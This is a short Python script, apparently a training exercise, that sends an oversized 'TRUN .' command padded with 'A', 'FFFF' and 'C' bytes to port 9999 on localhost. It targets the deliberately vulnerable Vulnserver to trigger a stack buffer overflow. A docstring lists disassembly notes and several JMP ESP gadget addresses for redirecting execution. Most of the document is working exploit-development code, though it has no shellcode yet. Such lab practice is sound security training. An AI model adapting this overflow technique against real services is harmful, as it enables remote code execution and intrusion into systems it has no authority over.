
import socket
"""


JMP 004016A4  .....1

JMP  0040179E   .....1

---------------------
004016A4  ===> JE 004017A3 ===> 004016B1  ==> 004016B8  ===> 004016BD  ==>
004016DA =aceita

00401130   JMP ESP
00401132   JMP ESP
00401134   JMP ESP
00401136   JMP ESP
00401138   JMP ESP
0040113A   JMP ESP

"""


class Vulnserver:

    def teste1(self, ip):
        #bytes_para = 'A'*(2016 - len("AAAAAABBBB") - 8) + '0000'==> bfov
      #  bytes_para = 'A' * (2016 - len("AAAAAABBBB") ) + '0000'
        aa = (2040 - len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0000"))

        bytes_para = 'A' * aa + 'FFFF' + 'C'*2000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 9999))
        overflow = 'TRUN .' + bytes_para
        s.send(overflow.encode())
        resposta = s.recvfrom(20)
        #   time.sleep(1)
        print(resposta)


Vulnserver().teste1('localhost')
